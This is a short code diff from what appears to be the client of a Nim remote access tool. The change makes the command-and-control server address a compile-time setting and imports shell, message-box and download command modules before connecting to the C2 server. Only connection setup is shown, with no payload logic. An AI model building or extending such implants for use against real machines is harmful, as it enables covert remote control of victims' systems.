@@ -1,11 +1,15 @@
-import net, osproc, os, base64, json
+import net, base64, json
 
 import modules, communication
 
 import ../commands/[shell, msgbox, download]
 
 let client: Socket = newSocket()
-client.connect("127.0.0.1", Port(1234))
+
+const port {.intdefine.}: int = 1234
+const ip {.strdefine.}: string = "127.0.0.1"
+
+client.connect(ip, Port(port))
 
 proc receiveCommands(client: Socket) =
     client.connectToC2()
